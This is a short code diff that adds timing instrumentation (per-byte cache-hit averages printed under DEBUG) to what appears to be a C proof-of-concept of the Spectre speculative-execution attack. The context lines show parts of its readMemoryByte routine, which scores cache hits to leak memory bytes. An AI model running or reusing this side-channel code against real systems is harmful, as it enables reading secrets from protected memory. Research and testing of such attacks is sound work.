@@ -79,6 +79,7 @@ uint64_t read_cycles()
 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 {
 	static int results[256];
+	static double timing[256];
 	int tries, i, j, k, mix_i;
 	unsigned int junk = 0;
 	size_t training_x, x;
@@ -154,6 +155,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
 			{
 				results[mix_i]++; /* cache hit - add +1 to score for this value */
+				timing[mix_i] += time2;
 			}
 		}
 
@@ -180,6 +182,18 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 			{
 				k = i;
 			}
+		}
+	}
+
+	/* Print timing */
+	for (i = 0; i < 256; i++)
+	{
+		if (results[i] > 0)
+		{
+			timing[i] /= MAX_TRIES;
+			#ifdef DEBUG
+			printf("%d: %d (%f)\n", i, results[i], timing[i]);
+			#endif
 		}
 	}
 
